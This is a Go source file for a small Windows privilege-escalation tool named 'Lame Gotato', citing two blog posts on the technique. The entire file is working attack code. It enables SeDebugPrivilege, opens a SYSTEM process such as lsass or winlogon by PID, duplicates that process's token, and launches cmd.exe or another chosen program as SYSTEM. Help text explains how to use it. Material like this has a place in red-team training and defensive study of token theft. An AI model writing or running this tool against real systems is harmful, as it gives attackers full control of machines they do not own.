//https://medium.com/swlh/straight-outta-script-kiddie-zone-deep-dive-on-how-to-get-a-system-shell-on-windows-fe97236e27e1
//https://anubissec.github.io/How-To-Call-Windows-APIs-In-Golang/

package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procLookupPrivilegeValue    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

type winLUID struct {
	LowPart  uint32
	HighPart int32
}

// LUID_AND_ATTRIBUTES
type winLUIDAndAttributes struct {
	Luid       winLUID
	Attributes uint32
}

// TOKEN_PRIVILEGES
type winTokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [1]winLUIDAndAttributes
}

func main() {

	var (
		flPid         = flag.Int("SystemPID", 0, "Specify the PID of a process running as SYSTEM (winlogon & lsass work)")
		flApplication = flag.String("Spawn", "C:\\Windows\\System32\\cmd.exe", "Specify the program you want to spawn with SYSTEM Token")
		flHelp        = flag.Bool("h", false, "Display help")
	)
	flag.Parse()

	if *flHelp {
		fmt.Println("\n\t\t\tLAME GOTATO HELP")
		fmt.Println("\n\t**Lame Gotato must be run with admin privileges**")
		fmt.Println("-SystemPID <PID>\t\tSpecify a Process running as SYSTEM, that token will be duplicated. (Lsass & Winlogon work well)\n-Spawn <Path To Executable>\tSpecify the process to spawn with the SYSTEM token")
		fmt.Println("\nThe only parameter required is the -SystemPID.\nthe default process spawned is C:\\Windows\\System32\\cmd.exe\n")
		os.Exit(1)
	}
	if *flPid == 0 {
		fmt.Println("You must specify a PID.")
		os.Exit(1)
	}

	handle, err := syscall.GetCurrentProcess()
	check(err)

	var token syscall.Token
	err = syscall.OpenProcessToken(handle, 0x0028, &token)
	check(err)
	defer token.Close()
	tokenPrivileges := winTokenPrivileges{PrivilegeCount: 1}
	lpName := syscall.StringToUTF16("SeDebugPrivilege")
	procLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(&lpName[0])), uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)))

	tokenPrivileges.Privileges[0].Attributes = 0x00000002 // SE_PRIVILEGE_ENABLED
	_, _, err = procAdjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tokenPrivileges)), uintptr(unsafe.Sizeof(tokenPrivileges)), 0, 0)

	//privCheck() //Sepriv should be enabled

	var processQueryInformation = 0x0400
	opProcesshandle, err := windows.OpenProcess(uint32(processQueryInformation), true, uint32(*flPid)) // last param is pid
	check(err)

	var token2 windows.Token
	err = windows.OpenProcessToken(opProcesshandle, windows.TOKEN_READ|windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &token2)
	check(err)

	var newToken windows.Token
	err = windows.DuplicateTokenEx(token2, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &newToken)
	check(err)

	var logonNetCredsOnly uint32 = 0x00000002
	var NewConsole uint32 = 0x00000010
	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation

	//appname, err := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)
	appname, err := syscall.UTF16PtrFromString(*flApplication)
	check(err)

	_, _, err = procCreateProcessWithTokenW.Call(uintptr(newToken), uintptr(logonNetCredsOnly), uintptr(unsafe.Pointer(appname)), uintptr(0), uintptr(NewConsole), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&sI)), uintptr(unsafe.Pointer(&pI)))
	check(err)

}

func check(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
